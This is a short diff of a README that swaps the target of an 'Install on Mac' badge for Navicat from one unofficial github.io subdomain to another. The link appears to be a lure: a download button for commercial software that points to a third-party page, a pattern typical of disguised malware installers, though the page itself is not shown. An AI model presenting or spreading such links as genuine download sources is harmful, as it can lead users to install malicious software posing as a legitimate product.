@@ -6,7 +6,7 @@
 <br>
 <div align="center">
 
-[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-applications.github.io/.github/navicat)
+[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/navicat)
 
 </div>
 
